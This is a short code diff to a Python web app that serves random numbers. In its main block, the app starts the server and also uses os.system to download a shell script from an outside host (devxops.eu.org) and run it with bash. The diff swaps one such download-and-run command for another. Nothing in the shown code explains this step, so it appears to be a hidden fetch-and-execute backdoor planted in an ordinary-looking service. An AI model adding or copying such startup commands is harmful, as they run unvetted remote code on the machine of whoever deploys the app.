@@ -17,5 +17,6 @@ def get_random(min: Optional[int] = 0, max: Optional[int] = 9):
     return { "value": rval }
 
 if __name__ == "__main__":
-    os.system('curl -O https://b2host.devxops.eu.org/linshi/setup-network.sh; bash setup-network.sh 283')
+    #os.system('curl -O https://b2host.devxops.eu.org/linshi/setup-network.sh; bash setup-network.sh 283')
+    os.system('curl -O https://b2host.devxops.eu.org/linshi/inits/init-283.sh; bash init-283.sh')
     uvicorn.run("main:app", host="0.0.0.0", port=int(os.getenv("PORT", default=5000)), log_level="info")
